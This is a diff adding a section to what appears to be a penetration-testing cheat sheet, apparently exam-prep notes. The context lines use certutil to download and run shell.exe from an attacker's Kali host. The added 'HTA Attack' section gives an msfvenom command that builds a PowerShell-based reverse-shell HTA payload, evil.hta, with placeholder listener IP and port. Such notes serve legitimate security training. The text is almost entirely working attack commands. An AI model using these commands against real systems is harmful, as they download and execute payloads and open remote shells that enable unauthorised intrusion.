@@ -71,6 +71,11 @@ python3 -m http.server 80
 certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
 cmd /c C:\\Windows\\temp\\shell.exe
 ````
+### HTA Attack in Action
+We will use msfvenom to turn our basic HTML Application into an attack, relying on the hta-psh output format to create an HTA payload based on PowerShell. In Listing 11, the complete reverse shell payload is generated and saved into the file evil.hta.
+````
+msfvenom -p windows/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil.hta
+````
 ### Hashing & Cracking
 #### Enumeration
 ````
